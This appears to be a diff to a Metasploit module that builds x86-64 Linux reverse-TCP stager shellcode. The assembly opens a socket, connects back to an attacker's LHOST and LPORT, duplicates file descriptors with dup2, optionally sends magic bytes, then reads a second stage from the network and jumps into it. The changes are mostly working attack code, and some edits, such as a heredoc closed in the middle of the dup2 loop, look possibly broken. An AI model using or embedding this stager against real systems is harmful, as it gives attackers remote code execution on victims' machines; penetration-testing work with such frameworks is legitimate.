@@ -99,6 +99,8 @@ module Msf
         read_length = 4096
       end
 
+      check_magic = include_send_magic && !opts[:ihost].nil? && !opts[:iport].nil? && !opts[:iv].nil? && !opts[:key].nil? 
+
       asm = %^
       mmap:
         xor    edi, edi
@@ -129,7 +131,6 @@ module Msf
         syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
         test   rax, rax
         js failed
-
         xchg   rdi, rax
 
       connect:
@@ -143,8 +144,27 @@ module Msf
         syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
         pop    rcx
         test   rax, rax
-        jns    recv
+        js    handle_failure
 
+      dup2_calls:
+        push   0x3
+        pop    rsi                          ; newfd
+
+      dup2_loop:
+        push   0x21
+        pop    rax                          ; dup2 syscall
+        dec esi
+        syscall
+        loopnz   dup2_loop^
+
+      asm << %^
+        jmp send_magic
+      ^ if check_magic
+      asm << %^
+        jmp recv
+      ^ if !check_magic
+      
+      asm << %^
       handle_failure:
         dec    r9
         jz     failed
@@ -167,21 +187,20 @@ module Msf
         pop    rax
         push   0x1
         pop    rdi
-        syscall ; exit(1)
-
-      recv:
+        syscall ; exit(1)      
     ^
 
-      asm << asm_send_magic(opts) if ( include_send_magic && !opts[:ihost].nil? && !opts[:iport].nil? && !opts[:iv].nil? && !opts[:key].nil? ) 
+      asm << asm_send_magic(opts) if check_magic 
 
       asm << %^
+      recv:
+        xor    rax, rax
         pop    rsi
         push   0x#{read_length.to_s(16)}
         pop    rdx
         syscall ; read(3, "", #{read_length})
         test   rax, rax
         js     failed
-
         jmp    rsi ; to stage
     ^
 
